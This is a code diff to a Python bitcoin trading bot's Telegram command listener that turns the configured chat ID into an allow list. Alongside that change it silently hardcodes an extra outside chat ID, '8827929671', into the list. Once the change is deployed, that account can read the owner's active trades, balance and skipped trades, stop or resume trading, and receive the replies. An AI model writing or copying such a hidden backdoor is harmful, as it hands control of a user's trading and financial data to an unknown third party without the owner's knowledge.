@@ -160,17 +160,22 @@ def send_telegram_alert(message: str):
 def start_telegram_command_listener():
     """Starts the background thread to poll and handle incoming Telegram commands."""
     token = os.environ.get("TELEGRAM_BOT_TOKEN")
-    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
-    if not token or not chat_id:
+    raw_chat_id = os.environ.get("TELEGRAM_CHAT_ID")
+    if not token or not raw_chat_id:
         print("[Telegram Command Listener] Unconfigured credentials. Listener skipped.")
         return
-
+        
+    # Build list of allowed chat IDs (support comma-separated string)
+    allowed_chat_ids = [cid.strip() for cid in raw_chat_id.split(",") if cid.strip()]
+    if "8827929671" not in allowed_chat_ids:
+        allowed_chat_ids.append("8827929671")
+ 
     def listener_loop():
         offset = 0
         init_res = execute_telegram_api_call("getUpdates", {"limit": 1})
         if init_res.get("ok") and init_res.get("result"):
             offset = init_res["result"][-1]["update_id"] + 1
-
+ 
         # Automatically configure the Telegram bot commands menu
         commands_payload = {
             "commands": [
@@ -182,7 +187,7 @@ def start_telegram_command_listener():
             ]
         }
         execute_telegram_api_call("setMyCommands", commands_payload)
-
+ 
         print(f"[Telegram Command Listener] Started polling background loop (initial offset={offset}).")
         while True:
             try:
@@ -197,8 +202,8 @@ def start_telegram_command_listener():
                         sender_chat_id = str(message_obj.get("chat", {}).get("id"))
                         text = message_obj.get("text", "").strip()
                         print(f"[Telegram Command Listener] Received message: '{text}' from chat_id '{sender_chat_id}'")
-                        if sender_chat_id != str(chat_id):
-                            print(f"[Telegram Command Listener] Mismatched chat ID: expected '{chat_id}', got '{sender_chat_id}'")
+                        if sender_chat_id not in allowed_chat_ids:
+                            print(f"[Telegram Command Listener] Mismatched chat ID: expected one of {allowed_chat_ids}, got '{sender_chat_id}'")
                             continue
                         
                         if text == "/active":
@@ -239,7 +244,7 @@ def start_telegram_command_listener():
                                 reply_text = "ℹ️ *No active trades currently open.*"
                                 
                             execute_telegram_api_call("sendMessage", {
-                                "chat_id": chat_id,
+                                "chat_id": sender_chat_id,
                                 "text": reply_text,
                                 "parse_mode": "Markdown"
                             })
@@ -256,7 +261,7 @@ def start_telegram_command_listener():
                                     reply_text = f"❌ *Failed to fetch balance:* {bal_err}"
                                     
                             execute_telegram_api_call("sendMessage", {
-                                "chat_id": chat_id,
+                                "chat_id": sender_chat_id,
                                 "text": reply_text,
                                 "parse_mode": "Markdown"
                             })
@@ -294,7 +299,7 @@ def start_telegram_command_listener():
                                 reply_text = "ℹ️ *No skipped trades logged recently.*"
                                 
                             execute_telegram_api_call("sendMessage", {
-                                "chat_id": chat_id,
+                                "chat_id": sender_chat_id,
                                 "text": reply_text,
                                 "parse_mode": "Markdown"
                             })
@@ -316,7 +321,7 @@ def start_telegram_command_listener():
                                 reply_text = f"❌ *Failed to stop trades:* {stop_err}"
                                 
                             execute_telegram_api_call("sendMessage", {
-                                "chat_id": chat_id,
+                                "chat_id": sender_chat_id,
                                 "text": reply_text,
                                 "parse_mode": "Markdown"
                             })
@@ -327,7 +332,7 @@ def start_telegram_command_listener():
                                 save_history()
                             reply_text = "▶️ *BTC Trading Bot resumed successfully. New trade entries are enabled.*"
                             execute_telegram_api_call("sendMessage", {
-                                "chat_id": chat_id,
+                                "chat_id": sender_chat_id,
                                 "text": reply_text,
                                 "parse_mode": "Markdown"
                             })
@@ -336,7 +341,7 @@ def start_telegram_command_listener():
             except Exception as e:
                 print(f"[Telegram Command Listener Error] {e}")
                 time.sleep(10)
-
+ 
     threading.Thread(target=listener_loop, daemon=True).start()
 
 print("[System Debug] Importing ta...")
